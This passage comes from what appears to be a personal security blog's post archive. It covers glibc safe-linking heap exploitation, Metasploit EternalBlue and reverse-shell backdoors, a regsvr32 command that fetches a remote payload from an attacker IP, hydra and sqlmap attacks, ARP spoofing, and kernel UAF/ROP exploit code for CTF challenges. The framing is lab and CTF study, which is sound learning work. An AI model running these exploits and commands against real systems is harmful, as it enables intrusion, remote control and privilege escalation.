(tmp->next))\n//----------------------------------------\nnextp = REVEAL_PTR (p->fd);\n```\n\n```c\n#define REMOVE_FB(fb, victim, pp)\t\t\t\\\ndo\t\t\t\t\t\t\t\\\n{\t\t\t\t\t\t\t\\\n\tvictim = pp;\t\t\t\t\t\\\n\tif (victim == NULL)\t\t\t\t\\\n\tbreak;\t\t\t\t\t\t\\\n\tpp = REVEAL_PTR (victim->fd);                                     \\\n\tif (__glibc_unlikely (pp != NULL && misaligned_chunk (pp)))       \\\n\tmalloc_printerr (\"malloc(): unaligned fastbin chunk detected\"); \\\n}\t\t\t\t\t\t\t\\\nwhile ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \\\n\t != victim);\t\t\t\t\t\\\n```\n\n等多多少少用到tcache和fastbin的地方。而unsortebin、largebin、smallbin都不会进行相关指针异或。\n\n### (2)新增机制Safe-linking的漏洞\n\n#### ①规律性\n\n官方说的是\n\n```\n/* Safe-Linking:\nUse randomness from ASLR (mmap_base) to protect single-linked lists\nof Fast-Bins and TCache.  That is, mask the \"next\" pointers of the\nlists' chunks, and also perform allocation alignment checks on them.\nThis mechanism reduces the risk of pointer hijacking, as was done with\nSafe-Unlinking in the double-linked lists of Small-Bins.\nIt assumes a minimum page size of 4096 bytes (12 bits).  Systems with\nlarger pages provide less entropy, although the pointer mangling\nstill works.  */\n```\n\n基于ASLR之后的堆地址，即Key值为第一个进入该大小TcacheBin链的chunk的地址右移12bit得到，对于Fastbin也是一样的。\n\n![Snipaste_2021-08-25_19-54-16](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210826213422.png)\n\n#### ②特殊性\n\n虽说FD被加密，但是由于是异或的关系，在UAF的特殊条件下其实是可以控制FD指向其他堆块的。\n\n比如说我们进行一定的堆布局，尝试将堆块集中在0x100内，然后可以爆破1个字节来进行计算：\n\n![Snipaste_2021-08-25_17-50-30](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210826213439.png)\n\n这里就chunk4->chunk3->chunk2->chunk1。\n\n这里就假设我们爆破1字节后已经知道了heapbase/0x1000左移12bit的最后一个字节为0x59。现在进行计算一下，如果我们想把chunk4的FD指向chunk1在没有Leak的情况下应该怎么修改？\n\n计算0x10^0x59=0x49，所以如果我们利用UAF部分写chunk4的FD的第一个字节为0x49，那么实际上其实指向的就是chunk1。这个在没有泄露地址而Size又做限制导致只能用Fastbin和Tcache时，可以采用这种方法爆破。所以实际上的期望应该是1/256，这个尝试一下应该就可以实现的。\n\n### (3)新增Tcache地址对齐检查\n\n#### ①tcache_get中\n\n```c\n//2.32\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    if (__glibc_unlikely (!aligned_OK (e)))\n        malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n    tcache->entries[tc_idx] = REVEAL_PTR (e->next);\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n\n//2.31\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    tcache->entries[tc_idx] = e->next;\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n```\n\n可以看到在tcache_get中新增了一个检查\n\n```C\nif (__glibc_unlikely (!aligned_OK (e)))\n    malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n```\n\n这个导致了我们的tcache不能任意申请了，**必须是0x10对齐的**，这个可能会导致不少的手段变化。\n\n#### ②tcache结构释放函数中\n\n```c\ntcache_thread_shutdown (void)\n{\n    int i;\n    tcache_perthread_struct *tcache_tmp = tcache;\n\n    if (!tcache)\n        return;\n\n    /* Disable the tcache and prevent it from being reinitialized.  */\n    tcache = NULL;\n    tcache_shutting_down = true;\n\n    /* Free all of the entries and the tcache itself back to the arena\n     heap for coalescing.  */\n    for (i = 0; i < TCACHE_MAX_BINS; ++i)\n    {\n        while (tcache_tmp->entries[i])\n        {\n            tcache_entry *e = tcache_tmp->entries[i];\n            if (__glibc_unlikely (!aligned_OK (e)))\n                malloc_printerr (\"tcache_thread_shutdown(): \"\n                                 \"unaligned tcache chunk detected\");\n            tcache_tmp->entries[i] = REVEAL_PTR (e->next);\n            __libc_free (e);\n        }\n    }\n\n    __libc_free (tcache_tmp);\n}\n```\n\n```c\nif (__glibc_unlikely (!aligned_OK (e)))\n    malloc_printerr (\"tcache_thread_shutdown(): \"\n                     \"unaligned tcache chunk detected\");\n```\n\n即当程序退出，释放tcache结构体时会加入对tcache中所有chunk进行地址对齐检查，但是这个对exit()的攻击没什么影响。\n\n#### ③Tcache中double free检查中\n\n```c\nif (__glibc_unlikely (e->key == tcache))\n{\n    tcache_entry *tmp;\n    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\n    for (tmp = tcache->entries[tc_idx];\n         tmp;\n         tmp = REVEAL_PTR (tmp->next))\n    {\n        if (__glibc_unlikely (!aligned_OK (tmp)))\n            malloc_printerr (\"free(): unaligned chunk detected in tcache 2\");\n        if (tmp == e)\n            malloc_printerr (\"free(): double free detected in tcache 2\");\n        /* If we get here, it was a coincidence.  We've wasted a\n\t   few cycles, but don't abort.  */\n    }\n}\n```\n\n```c\nif (__glibc_unlikely (!aligned_OK (tmp)))\n    malloc_printerr (\"free(): unaligned chunk detected in tcache 2\");\n```\n\n当tcache进行Free的double free检查时，如果tcache中第一个bin的chunk地址不对齐，也会错误。其实最开始不太理解，想这能有啥用，最开始Free的时候不就已经进行地址对齐检查了吗。后面想到由于stashing机制，可能会将地址不合法的Chunk放入到tcache中，所以再进行对应Bin大小的chunk释放时，进行检查提高安全性吧。**这个我们在利用的时候也需要注意下，别到时候得到了用Stashing机制放入一个不合法chunk之后再free导致程序出错了。**\n\n想感叹一下，在2.31及以下版本，只有在_int_free函数中才有一个地址对齐检查，这2.32突然加了好几个，真是挺猛的。\n\n\n\n## 2.UAF常见限制\n\n### (1)UAF+Leak+Size不做限制:\n\n这个如上图中就可以直接leak出chunk1的内容得到key，然后释放unsortedbin chunk泄露libc地址后，利用key异或对应地址即可任意申请。\n\n### (2)UAF+Leak+Size做限制:\n\n一样的，Leak出key之后，修改size得到unsortedbin chunk之后泄露libc地址，异或改掉FD任意申请chunk。\n\n### (3)UAF+无Leak+Size做限制:\n\n这条件下的想半天实在没想出来，爆破两个字节倒是可以申请到Tcache结构体，但是两个字节的期望却达到了0xffff=65535，实际的线上CTF中可能爆出来黄花菜都凉了。\n\n▲爆破两字节申请Tcache Struct：\n\n比如我们先爆破一个字节，使得heapbase的地址为0xabcde5500000\n\n然后我们按照上述方法，用一定堆布局，计算一下地址\n\n异或之后的地址应该为：\n\n```c\nchunk1:\t\t\t\t0xabcde5500400 ^ 0xabcde5500 = 0x--(0x0400^0x5500)\nTcacheStruct:\t\t0xabcde5500000 ^ 0xabcde5500 = 0x--(0x0000^0x5500)\n```\n\n那么就可以直接该指向chunk1地址的最后两个字节为5500即可指向Tcache结构体，然后释放进入unsortedbin踩下libc地址再爆破申请stdout泄露地址，这样又会出来半个字节爆破空间。即0xfffff=1048575，直接GG。\n\n▲size做限制其实没差别，可以爆破一个字节来修改的。\n\n\n\n# 总结\n\n这次总结堆利用方法让我也学到了好多，翻了好多源码，很多以前不明所以的东西翻了相关源码之后感觉一下子就清楚了。\n\n这篇文章持续更新，以后再发现有意思的地方再回来更新。\n\n当然，UAF其实是特别好利用的一种，高版本下也对应有很多的骚操作，比如\n\n`house of pig` :[house of pig一个新的堆利用详解 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/242640)\n\n`house of banana` :[house of banana - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/222948)\n\n等等现在大多的题目都是off by null + 堆布局，尤其是堆布局这一块，实在是无比考验对堆的理解，因为万一其中哪个地方想错，直接就得推倒重来。\n\n后面找时间再总结下off by null吧。\n\n","tags":["Heap"],"categories":["PWN","pwn堆-UAF"]},{"title":"1.metasploit-win7永恒之蓝-ms17_010复现","url":"/2021/08/19/1.metasploit-win7永恒之蓝-ms17_010复现/","content":"\n开了防火墙的话可能都ping不通，需要各种绕过\n\n一、前期工作：\n\n1.首先信息收集，获取真实IP，然后扫描，很多种，参数太多：\n\nnmap -O -p445 ip：检查是否开启445端口及主机操作系统\n\ndb_nmap -sT -T4 ip：快速扫描，db是database\n\n2.然后看有没有漏洞，需要对漏洞有一定掌握\n\n3.在metasploit下查找漏洞的使用模块和扫描模块等，下面利用win7的永恒之蓝漏洞：\n\nsearch ms17_011：查找该漏洞的相关\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510199.png)\n\n4.先使用该模块扫描看看有没有该漏洞：\n\n(1)进入模块并且配置模块信息：\n\nuse auxiliary/scanner/smb/smb_ms17_010\n\nshow options\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509941.png)\n\nset RHOSTS ip\n\n(2)使用该模块来扫描：\n\nrun或者exploit\n\n \n\n检测到可能有，那么使用攻击模块：\n\n5.使用攻击模块进行攻击：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509097.png)\n\nset RHOSTS ip\n\nexploit\n\n6.得到目的主机的shell：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509506.png)\n\n7.为了不乱码，设置编码格式为utf-8：\n\nchcp 65001\n\n8.调换至后台，输入sessions可以查看，sessions id可以进入：\n\nbackground\n\nsessions\n\nsessions id\n\n9.为了更好利用，调换至meterpreter模式：\n\nsessions -u 1\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509822.png)\n\n \n\n \n\n二、生成后门程序传到在目标机器上，这样下回目标机器运行该程序，主机监听到之后就可以直接进入了，不管漏洞在不在。\n\n1.生成后门程序：\n\n①msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f exe > localmsf8881.exe\n\n②msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f raw > localmsf8881.py\n\n③msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f raw > localmsf8881.php\n\n可以生成很多种后门程序，只要在目标机器上运行，那么就可以利用\n\n2.本机上使用模块，设置payload和监听端口：\n\nuse exploit/multi/handler\n\nset payload windows/meterpreter/reverse_tcp\n\nset LHOST 192.168.80.158\n\nset LPORT 8881\n\nrun\n\n3.现在如果靶机上运行localmsf8881，就会传回信息给主机，主机上的这个命令行就会得到一个meterpreter的session，之后就可以进入了\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510616.png)\n","tags":["WEB"],"categories":["WEB"]},{"title":"2.metasploit-部分命令执行获取权限","url":"/2021/08/19/2.metasploit-部分命令执行获取权限/","content":"\n一、前期运行：web中，当可以输入某些查询框时，该输入会被运行在命令行中，例如ping命令。(DVWA)\n\n1.web要求输入ip地址，经检查可以发现输入的内容会被完整运行到服务器的命令行下。\n\n例如输入127.0.0.1 && whoami，web反馈的信息除了ping 127.0.0.1，还会将whoami这个命令的信息给返回。\n\n2.在Msfconsle中使用web_delivrery模块use exploit/multi/script/web_delivery，之后设置对应参数：\n\n(1)设置target，需要目标服务器上有对应脚本语言，使得目标服务器上能够运行我们注入的命令，打不动就代表没有，或者没有写入环境变量等等原因：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506647.png)\n\n这里选择目标语言为Regsvr32\n\n(2)查看还需要的配置，配置一下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505056.png)\n\n这里的lhost就是攻击方的ip\n\n(3)设置攻击载荷，生成注入命令：\n\nset payload windows/meterpreter/reverse_tcp  (使用windows的meterpreter，建立连接reverse_tcp)\n\n然后就会生成命令：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505298.png)\n\n这就代表我们需要进行命令注入，在目标服务器上执行：\n\nregsvr32 /s /n /u /i:http://192.168.80.159:8080/IVJqvpIJSzu.sct scrobj.dll\n\n此时msfconsole就会进入停滞状态，一旦检查到有目标服务器运行了上述命令，就会生成meterpreter连接。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506787.png)\n\n打不通可能是防火墙或者杀毒软件之类的关系\n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"3.弱口令密码破解登录","url":"/2021/08/19/3.弱口令密码破解登录/","content":"\n1.制作字典：\n\n(1)利用cewl制作：\n\ncewl -d 2 -m 5 -w word.txt [www.baidu.com](http://www.baidu.com)\n\n(d:deepth，爬取层数\n\nm:....性能，设置越大爬取越快)\n\n(2)利用工具制作：\n\nhttp://www.bugku.com/mima/ 输入相应信息即可生成\n\n(3)利用github上的工具：\n\nhttps://github.com/TheKingOfDuck/fuzzDicts\n\nhttps://github.com/fuzzdb-project/fuzzdb\n\n▲生成的字典可能有中文，使用%s/\\v[^\\x00-\\xff]+//g来强制删除中文[^\\x00-\\xff]即中文的表示，双字节字符\n\n \n\n2.利用字典爆破SSH/RDP:\n\n(1)先扫描是否开启了ssh端口：\n\nnmap -sT -T4 ip：快速扫描\n\n(1)使用hydra:\n\n参数设置:\n\n-l(Login)：想要破解的用户，例如root\n\n-L(FILE)：指定用户名字典\n\n-p(pass)：指定密码，如果有密码还爆破干啥\n\n-P(FILE)：指定密码字典\n\n-s(PORT)：指定爆破端口\n\n-M(FILE)：指定目标列表文件，如果有多个IP目标需要攻击，可用来指定\n\n-C(FILE)：\n\n-f ：使用-M参数后，找到第一登录名和密码即终止\n\n▲hydra -l root -p root 127.0.0.1 -s 2222 ssh -f：用root密码登录root通过ssh\n\n▲hydra -l root -P word.txt 127.0.0.1 -s 2222 -f ssh\n\n▲hydra -l administrator -P word.txt 127.0.0.1 rdp(类似windows下的ssh)\n\n★可以使用kali自带的密码字典尝试：\n\n目录在/usr/share/wordlists/metasploit/下，有很多字典密码\n\n(2)使用msf攻击\n\n①搜索一下：search login //login等等\n\n②通过查找到的使用该模块：use auxiliary/scanner/ssh/ssh_login\n\n③show options看一下需要设置什么信息，设置ip，用户名，密码字典，端口，爆破线程数量等信息，然后直接run即可。\n\nset RHOST/USERNAME/PASS_FILE/RPORT/THREADS等等\n\n \n\n3.Burp(burpsuite)爆破后台密码：(还没学)\n\n \n\n \n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"4.SQL注入","url":"/2021/08/19/4.SQL注入/","content":"\n一、SQL注入：\n\n1.常用命令：\n\n \n\n2.SQLMAP使用：\n\n(1)前置了解：\n\n官方网址：http://sqlmap.org\n\nGithub网址：https://github.com/sqlmapproject/sqlmap\n\nhttps://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md\n\n使用手册：https://github.com/sqlmapproject/sqlmap/wiki/Usage\n\n(2)常用类型：\n\n▲基于布尔的盲注：GET型\n\n攻击流程：\n\n①测试目标是否存在sql注入：sqlmap -u ip\n\n这里就可能会返回payload，可以用来自定义使用\n\n②之后查找所有database：sqlmap -u ip --dbs\n\n③查找所有tables：sqlmap -u ip --tables\n\n④查找存储的属性字段：sqlmap -u ip -D database_name -T table_name --columns\n\n⑤依据属性字段查找想要的数据：sqlmap -u ip -D database_name -T table_name -C column_1,column_2... --dump\n\n(例如table中可能就保存id,username,password的属性，就可以查找账号密码出来)\n\n \n\n▲针对登录框的SQL注入：POST型\n\n①利用burpsuite抓请求登录的包，查看(需要先设置代理，然后拦截，8080可能不行，得其它端口代理)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191504869.png)\n\nusername=admin&password=admin&authorization=\n\n最下面的这个基本就是我们传输的请求登录信息。\n\n②然后将这些内容保存下来，生成一个文件sql.txt，将这个文件用sqlmap运行分析：\n\nsqlmap -r sql.txt\n\n这样就开始从sql.txt文件中分析了，判断到底有没有sql注入漏洞，有的话就应该有对应的payload生成出来。\n\n▲之后就类似上面的，获取数据库，table等等信息，从而最终获取服务器的登录账号和密码。\n\n \n\n▲其它类型的测试：测试共5级\n\n测试注入时加上参数--level=LEVEL\n\n①默认：GET和POST测试\n\n②2级：测试cookie：\n\n(看服务器会不会根据cookie来获取用户数据)\n\nsqlmap -r sql.txt --level=2\n\n②3级：测试HTTP User-Agent/Referer头的值\n\n \n\n3.SQL-Shell：\n\n(1)通过漏洞进入SQL-Shell：\n\nsqlmap -r sql.txt --level=5 --sql-shell\n\n这样如果能进入就可以直接用SQL语句来查询数据\n\n(2)通过漏洞进入OS-shell：\n\nsqlmap -r sql.txt --level=5 --os-shell\n\n①之后需要选择Web站点的搭建语言，通过插件或者其它形式判断(php,jsp等等)\n\n②然后需要输入一个可以往里面写东西的文件目录：例如/var/www/upload\n\n这里目录可以通过工具来查找：\n\n```\n#注释头\n\ngit clone https://github.com/maurosoria/dirsearch\ncd dirsearch\npython3 dirsearch.py -u ip\n```\n\n \n\n这样sqlmap就可以上传东西，写入一些类似于web-shell等东西，从而获取权限。\n\n③那么就进入os-shell了，可以获取到服务器权限\n","tags":["WEB"],"categories":["WEB"]},{"title":"5.利用Cobaltstrike获取权限","url":"/2021/08/19/5.利用Cobaltstrike获取权限/","content":"\n一、攻击weblogic(端口基于7001)：\n\n▲前置环境部署：\n\n```\n#注释头\n\ngit clone https://github.com/vulhub/vulhub.git\ncd  vulhub/\ncd  weblogic/\ncd CVE-......(选择一种漏洞)\ndocker-compose up -d\n```\n\n这样就搭建了好了该漏洞的环境，使用docker ps -a可以看到端口映射到本地，所以在本地输入127.0.0.1:7001即可看到对应的weblogic服务。\n\n输入127.0.0.1:7001/console可以进入到服务界面\n\n \n\n1.利用WeblogicScan先扫描看看有没有weblogic的漏洞:\n\n```\n#注释头\n\ngit clone https://github.com/dr0op/WeblogicScan.git\ncd WeblogicScan\npip3 install -r requirements.txt\npython3 WeblogicScan.py ip 7001\n```\n\n2.有cve漏洞后上网搜索对应的利用poc来打攻击\n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"arp欺骗","url":"/2021/08/19/6.ARP欺骗/","content":"\n1.首先查看和自己同属一个网段下的ip：\n\nnbtscan -r 192.168.80.167/24\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503723.png)\n\n这里157即为目标ip，167即为本机攻击ip\n\n(这个需要apt-get install nbtscan)\n\n2.然后使用工具arpspoof进行欺骗，kalilinux自带：\n\n(1)arpspoof -i eth0 -t 192.168.80.157 192.168.80.2\n\n(eth0是网卡接口，-t后是目标ip，之后的ip是该网段下的默认路由ip，可以通过route -n查询，或者其它方式)\n\n▲这个原理就是修改己方的Mac地址为默认路由的Mac地址，那么目标主机发出的MAC帧就会被己方接收。\n\n(2)如果攻击机开启了Ipv4的路由转发功能，那么arp欺骗不会成功，因为到达攻击机的包被转发出去了。\n\n①查看己方的路由转发功能是否开启：\n\ncat /proc/sys/net/ipv4/ip_forward\n\n为0则关闭，为1则开启了。\n\n②修改路由转发功能：\n\necho \"0\" > /proc/sys/net/ipv4/ip_forward\n\n这行命令是往该文件中写入0，关闭路由转发功能\n\nsysctl -p(让服务即可生效)\n\n▲另外永久开启服务的相关命令可以上网再查\n\n3.查看自己是否被ARP欺骗攻击：arp -a\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503844.png)\n\n可以看到在目标机器上在没有被攻击之前，默认路由ip对应的mac地址和攻击机ip对应的mac地址是不一样的，但是被攻击之后却变成一样的了。\n\n▲解决办法：\n\n(1)将dns服务器ip和mac静态绑定:\n\narp -s [dns_ip] [dns_mac]\n\n(2)如果不知道原来的dns服务器的mac地址，那么可以先arp -d清空一下arp缓存，然后arp -a查看，这时候原本的dns服务器就会发过来包，其MAC就能被看到。\n\n(3)如果攻击者一直执行欺骗程序，开启系统防火墙后清空arp缓存，也能抵御一般的arp欺骗。\n\n(4)如果防火墙还是抵御不了，或者不允许开启防火墙，那么就进行抓包，先将arp缓存清空，之后抓取dns服务器发过来的包，其MAC一定正确，将该MAC地址与dns服务器ip绑定。(没有抓包工具就重复清空缓存，查询，大不了整个bat批处理，一定会有攻击者攻击间隙使得dns服务器发过来的包被解析，然后再绑定)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503433.png)\n\n(5)如果攻击者充当中间人，截取dns发给受害者的服务包...那再说，估计只能破密了。\n\n▲可以事先将DNS的MAC定期备份，定期删除。\n\n4.开启目标机网络功能，截取目标机的数据包：\n\n▲使用的工具在不同协议和不同环境的抓取能力都不太一样\n\n(1)使用DSniff，支持Telnet 、Ftp、Smtp、P0P3、HTTP，以及其它的一些高层网络应用协议，用Telnet比较好用。比较老了，很多杀毒软件或者防火墙安全措施什么的都可以发现。\n\ndsniff -i eth0(有时候不太好用)\n\n(2)使用Ettercap\nettercap -Tq -i eth0(Tq是参数用的，过滤掉不必要的包)\n\n \n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"CISCN2017-babydriver","url":"/2021/08/19/CISCN2017-babydriver/","content":"\n1.常规解包分析:\n\n```\n//注释头\n\nmkdir rootfs\ncd rootfs\nmv ../rootfs.cpio rootfs.cpio.gz //改名，方便gunzip识别格式\ngunzip ./rootfs.cpio.gz //解压\ncpio -idm < ./rootfs.cpio //再次解压\n```\n\n2.查看init\n\n```\n#注释头\n\n#!/bin/sh\n\nmount -t proc none /proc\nmount -t sysfs none /sys\nmount -t devtmpfs devtmpfs /dev\nchown root:root flag\nchmod 400 flag\nexec 0</dev/console\nexec 1>/dev/console\nexec 2>/dev/console\n\ninsmod /lib/modules/4.4.72/babydriver.ko\nchmod 777 /dev/babydev\necho -e \"\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n\"\nsetsid cttyhack setuidgid 1000 sh\n\numount /proc\numount /sys\npoweroff -d 0 -f\n```\n\n可以看到加载了/lib/modules/4.4.72/babydriver.ko模块，权限为1000即普通权限，但是flag在root/下，需要root权限，那么需要提权。\n\n3.查看启动qemu命令：\n\n```\n#!/bin/bash\n\nqemu-system-x86_64\\ \n-initrd rootfs.cpio\\\n-kernel bzImage \\\n-append 'console=ttyS0 root=/dev/ram oops=panic panic=1'\\\n-enable-kvm \\\n-monitor /dev/null \\\n-m 64M \\\n--nographic\\\n-smp cores=1,threads=1 \\\n-cpu kvm64,+smep\\\n```\n\n很常规，唯一需要注意的是开启了smep保护\n\n4.IDA打开分析加载的babydriver.ko模块，一般漏洞就在这里，这里就是UAF漏洞，漏洞点在全局变量的设置：\n\n▲用到的知识点：这里由于是linux内核，那么当Linux内核模块链接到内核中，如果在Ko模块的源代码中它们具有全局变量，则每个全局变量只有一个副本，每个ko模块的设备程序共享这个全局变量\n\n(1)由于babydev_struct是个全局变量，所以打开两个babydriver.ko设备之后，第一个设备程序fd1使用command == 0x10001调用babyioctl函数，申请堆块后，如果第二个设备程序fd2再调用babyioctl函数申请堆块，则会覆盖掉babydev_struct.device_buf。\n\n(2)那么如果将第一个设备释放掉，则babydev_struct.device_buf指向的内存会被标记为释放状态，但是仍然可以通过fd2来修改这块内存，造成UAF。\n\n(3)最开始通过调用babyioctl函数将这块内存大小修改为size的堆块，之后如果再申请size大小的内存，就会先将这块内存申请回来，然后我们还是可以通过UAF使用fd2来修改这块本不应该能修改的内存。\n\n(4)这时就考虑将这块内存申请成什么样的内存来利用，这里一般有两种方法。\n\n▲方法一：利用cred结构体\n\n在kernel中，每一个进程都会创建一个cred结构体，用来存储进程的权限等信息\n\n①修改size大小为cred结构体大小，再利用fork创建子进程，过程中会创建的cred结构体，那么就可以将这块内存变成子进程的cred结构体。\n\n```\n//注释头\n\n// 打开两次设备，触发伪条件竞争\nint fd1 = open(\"/dev/babydev\", 2);\nint fd2 = open(\"/dev/babydev\", 2);\n\n// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)\nioctl(fd1, 0x10001, 0xa8);\n\n// 释放fd1\nclose(fd1);\n\n// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠\nint pid = fork();\n```\n\n②之后修改子进程cred中的uid，gid为0，使其为root权限，即可将子进程提权。提权之后即可调用system(\"/bin/sh\")获得root权限的shell。\n\n```\n//注释头\n\nif(pid < 0)\n{\n    puts(\"[*] fork error!\");\n    exit(0);\n}\n\nelse if(pid == 0)\n{\n    // 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0\n    char zeros[30] = {0};\n    write(fd2, zeros, 28);\n\n    if(getuid() == 0)\n    {\n        puts(\"[+] root now.\");\n        system(\"/bin/sh\");\n        exit(0);\n    }\n}\n\nelse\n{\n    wait(NULL);\n}\nclose(fd2);\n```\n\n▲方法二：打开设备ptmx，利用创建的tty_struct结构体和修改函数指针来ROP。\n\n(一般ROP的调用需要关掉smep保护)\n\n①修改size大小为tty_struct结构体大小，释放空间，之后用户空间打开ptmx设备，就会将这块内存申请为tty_struct结构体。\n\n```\n//注释头\n\nint fd1 = open(\"/dev/babydev\", O_RDWR);\nint fd2 = open(\"/dev/babydev\", O_RDWR);\nioctl(fd1, 0x10001, 0x2e0);\nclose(fd1);\nint fd_tty = open(\"/dev/ptmx\", O_RDWR|O_NOCTTY);\n```\n\n②修改tty_struct结构体中的const struct tty_operations *ops;指针指向用户空间伪造的fake_tty_operations结构体。\n\n```\n//注释头\n\nsize_t fake_tty_struct[4] = {0};\nread(fd2, fake_tty_struct, 32);\nfake_tty_struct[3] = (size_t)fake_tty_operations;\n```\n\n③将用户空间的fake_tty_operations中的write函数指针指向ROP链。\n\n```\n//注释头\n\nvoid* fake_tty_operations[30];\n--------------------------------------------------------------------\nfor(int i = 0; i < 30; i++)\n{\n    fake_tty_operations[i] = 0xFFFFFFFF8181BFC5;\n}\nfake_tty_operations[0] = 0xffffffff810635f5; //pop rax; pop rbp; ret;\nfake_tty_operations[1] = (size_t)rop;\nfake_tty_operations[3] = 0xFFFFFFFF8181BFC5; // mov rsp,rax ; dec ebx ; ret\n---------------------------------------------------------------------\nint i = 0;\nsize_t rop[32] = {0};\nrop[i++] = 0xffffffff810d238d;\t\t// pop rdi; ret;\nrop[i++] = 0x6f0;\nrop[i++] = 0xffffffff81004d80;\t\t// mov cr4, rdi; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = (size_t)get_root;\nrop[i++] = 0xffffffff81063694;\t\t// swapgs; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = 0xffffffff814e35ef;\t\t// iretq; ret;\nrop[i++] = (size_t)get_shell;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n \n\n④向ptmx设备写入内容，即可调用write函数从而调用ROP链。\n\n⑤利用ROP链关掉semp保护，之后Ret2Usr即可。\n\n \n\n \n\n \n","tags":["mimic"],"categories":["pwn-kernel","Kernel-ROP","Kernel-UAF"]},{"title":"QWB2019-babymimic","url":"/2021/08/19/QWB2019-babymimic/","content":"\nPWN拟态题，需要我们针对两个程序输入输出完全一致，exp要同时能够打穿两个程序。前期的爆破什么的就不看了，看[EX师傅的博客](http://blog.eonew.cn/archives/1009)就好了\n\n1.程序分为stkof32和stkof64，大多都相同，只是一个是64一个是32，然后程序是标准栈溢出，偏移不同，32位为272字节，64位为280字节，相差8个字节。这里就为一个exp攻破两个程序提供了漏洞，另外由于程序没有开PIE，所以可以直接ROP。\n\n2.这里就用相差的8个字节，即32位程序会比64位的多运行两个指令，那么就针对这两个指令来做文章。\n\n3.这里就是将64位程序的ROP链直接放在ret地址上，32位程序利用多出来的两个指令，下拉esp，把ROP链放在64位ROP链的后面：\n\n(1)64位：\n\n```python\n#注释头\n\n#function(rdi,rsi,rdx)\n\n#read /bin/sh\npayload += p64(pop_rax_ret) + p64(0x0)\npayload += p64(pop_rdi_ret) + p64(0x0)\npayload += p64(pop_rsi_ret) + p64(0x0069e200)\npayload += p64(pop_rdx_ret) + p64(0x200)\npayload += p64(syscall)\n\n#execve(\"/bin/sh\",0,0)\npayload += p64(pop_rax_ret) + p64(0x3b)\npayload += p64(pop_rdi_ret) + p64(0x0069e200)\npayload += p64(pop_rsi_ret) + p64(0x0)\npayload += p64(pop_rdx_ret) + p64(0x0)\npayload += p64(syscall)\n```\n\n(2)32位：\n\n```python\n#注释头\n\n#function(ebx,ecx,edx)\n\n#read /bin/sh \npayload += p32(pop_edx_ecx_edx_ret)\npayload += p32(0x200)+p32(0x080d7200)+p32(0x0)\npayload += p32(pop_eax_ret) + p32(0x3)\npayload += p32(int0x80)\n\n#execve(\"/bin/sh\",0,0)\npayload += p32(pop_edx_ecx_ebx_ret)\npayload += p32(0x0)+p32(0x0)+p32(0x080d7200)\npayload += p32(pop_eax_ret) + p32(0xb)\npayload += p32(int0x80)\n```\n\n(3)下拉rsp：\n\n```python\n#注释头\n\npayload = \"\"\npayload += \"A\"*offset +p32(add_0x100) + p32(0x0)\n```\n\n▲连起来就是：\n\n```python\n#注释头\n\n#add esp\npayload = \"\"\npayload += \"A\"*offset +p32(add_0x100) + p32(0x0)\n\n#read /bin/sh\npayload += p64(pop_rax_ret) + p64(0x0)\npayload += p64(pop_rdi_ret) + p64(0x0)\npayload += p64(pop_rsi_ret) + p64(0x0069e200)\npayload += p64(pop_rdx_ret) + p64(0x200)\npayload += p64(syscall)\n\n#execve(\"/bin/sh\",0,0)\npayload += p64(pop_rax_ret) + p64(0x3b)\npayload += p64(pop_rdi_ret) + p64(0x0069e200)\npayload += p64(pop_rsi_ret) + p64(0x0)\npayload += p64(pop_rdx_ret) + p64(0x0)\npayload += p64(syscall)\npayload.ljust(0x100-4,'\\x00')\n\n#read /bin/sh\npayload += p32(pop_edx_ecx_edx_ret)\npayload += 